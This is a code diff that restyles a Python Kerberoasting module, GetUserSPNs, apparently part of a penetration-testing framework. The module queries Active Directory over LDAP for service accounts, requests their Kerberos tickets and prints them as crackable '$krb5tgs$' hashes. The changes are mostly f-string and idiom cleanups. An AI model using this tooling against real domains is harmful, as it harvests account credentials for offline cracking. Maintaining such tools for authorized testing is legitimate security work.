@@ -64,18 +64,18 @@ class GetUserSPNs:
     def printTable(items, header):
         colLen = []
         for i, col in enumerate(header):
-            rowMaxLen = max([len(row[i]) for row in items])
+            rowMaxLen = max(len(row[i]) for row in items)
             colLen.append(max(rowMaxLen, len(col)))
 
         outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])
 
         # Print header
-        module.log('{}'.format(outputFormat.format(*header)), level='good')
-        module.log('{}'.format('  '.join(['-' * itemLen for itemLen in colLen])), level='good')
+        module.log(f'{outputFormat.format(*header)}', level='good')
+        module.log(f"{'  '.join(['-' * itemLen for itemLen in colLen])}", level='good')
 
         # And now the rows
         for row in items:
-            module.log('{}'.format(outputFormat.format(*row)), level='good')
+            module.log(f'{outputFormat.format(*row)}', level='good')
 
     def __init__(self, username, password, domain, cmdLineOptions):
         self.options = cmdLineOptions
@@ -97,9 +97,7 @@ class GetUserSPNs:
 
         # Create the baseDN
         domainParts = self.__domain.split('.')
-        self.baseDN = ''
-        for i in domainParts:
-            self.baseDN += 'dc=%s,' % i
+        self.baseDN = ''.join(f'dc={i},' for i in domainParts)
         # Remove last ','
         self.baseDN = self.baseDN[:-1]
 
@@ -112,7 +110,7 @@ class GetUserSPNs:
             s.login('', '')
         except Exception:
             if s.getServerName() == '':
-                raise Exception('Error while anonymous logging into %s' % self.__domain)
+                raise Exception(f'Error while anonymous logging into {self.__domain}')
         else:
             s.logoff()
         return s.getServerName()
@@ -130,7 +128,7 @@ class GetUserSPNs:
             pass
         else:
             domain = self.__domain
-            principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
+            principal = f'krbtgt/{domain.upper()}@{domain.upper()}'
             creds = ccache.getCredential(principal)
             if creds is not None:
                 TGT = creds.toTGT()
@@ -183,27 +181,25 @@ class GetUserSPNs:
                 constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                 hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
                 hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
-            module.log('{}'.format(entry), level='good')
+            module.log(f'{entry}', level='good')
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
             entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                 constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                 hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
                 hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
-            module.log('{}'.format(entry), level='good')
+            module.log(f'{entry}', level='good')
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
             entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                 constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                 hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
                 hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
-            module.log('{}'.format(entry), level='good')
+            module.log(f'{entry}', level='good')
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
             entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                 constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                 hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
                 hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
-            module.log('{}'.format(entry), level='good')
-        else:
-            pass
+            module.log(f'{entry}', level='good')
 
 
     def run(self):
@@ -211,19 +207,24 @@ class GetUserSPNs:
 
         # Connect to LDAP
         try:
-            ldapConnection = ldap.LDAPConnection('ldap://%s'%self.__target, self.baseDN, self.__kdcHost)
+            ldapConnection = ldap.LDAPConnection(
+                f'ldap://{self.__target}', self.baseDN, self.__kdcHost
+            )
+
             ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
         except ldap.LDAPSessionError as e:
-            if str(e).find('strongerAuthRequired') >= 0:
-                # We need to try SSL
-                ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcHost)
-                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
-            else:
+            if 'strongerAuthRequired' not in str(e):
                 raise
 
+                # We need to try SSL
+            ldapConnection = ldap.LDAPConnection(
+                f'ldaps://{self.__target}', self.baseDN, self.__kdcHost
+            )
+
+            ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
         # Building the search filter
         searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
-                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
+                           "(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
 
         try:
             resp = ldapConnection.search(searchFilter=searchFilter,
@@ -231,19 +232,18 @@ class GetUserSPNs:
                                                      'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                          sizeLimit=999)
         except ldap.LDAPSearchError as e:
-            if e.getErrorString().find('sizeLimitExceeded') >= 0:
-                module.log('sizeLimitExceeded exception caught, giving up and processing the data received', level='debug')
-                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
-                # paged queries
-                resp = e.getAnswers()
-            else:
+            if e.getErrorString().find('sizeLimitExceeded') < 0:
                 raise
 
+            module.log('sizeLimitExceeded exception caught, giving up and processing the data received', level='debug')
+            # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
+            # paged queries
+            resp = e.getAnswers()
         answers = []
-        module.log('Total of records returned {}'.format(len(resp)), level='info')
+        module.log(f'Total of records returned {len(resp)}', level='info')
 
         for item in resp:
-            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
+            if not isinstance(item, ldapasn1.SearchResultEntry):
                 continue
             mustCommit = False
             sAMAccountName =  ''
@@ -279,19 +279,19 @@ class GetUserSPNs:
 
                 if mustCommit is True:
                     if int(userAccountControl) & UF_ACCOUNTDISABLE:
-                        module.log('Bypassing disabled account {}'.format(sAMAccountName), level='debug')
+                        module.log(f'Bypassing disabled account {sAMAccountName}', level='debug')
                     else:
                         for spn in SPNs:
                             answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon])
             except Exception as e:
                 module.log('Skipping item, cannot process due to error', level='error')
 
-        if len(answers)>0:
+        if answers:
             self.printTable(answers, header=["ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet", "LastLogon"])
 
             if self.__requestTGS is True:
                 # Let's get unique user names and a SPN to request a TGS for
-                users = dict( (vals[1], vals[0]) for vals in answers)
+                users = {vals[1]: vals[0] for vals in answers}
 
                 # Get a TGT for the current user
                 TGT = self.getTGT()
@@ -304,7 +304,7 @@ class GetUserSPNs:
                                                                                 TGT['sessionKey'])
                         self.outputTGS(tgs, oldSessionKey, sessionKey, user, SPN)
                     except Exception as e:
-                        module.log('SPN Exception: {} - {}'.format(SPN, str(e)), level='error')
+                        module.log(f'SPN Exception: {SPN} - {str(e)}', level='error')
 
         else:
             module.log('No entries found!', level='info')
@@ -315,8 +315,7 @@ def run(args):
         module.log('Module dependencies (impacket, pyasn1, pyOpenSSL) missing, cannot continue', level='error')
         return
 
-    options = {}
-    options['dc_ip'] = args['rhost']
+    options = {'dc_ip': args['rhost']}
     executer = GetUserSPNs(args['user'], args['pass'], args['domain'], options)
     executer.run()
 
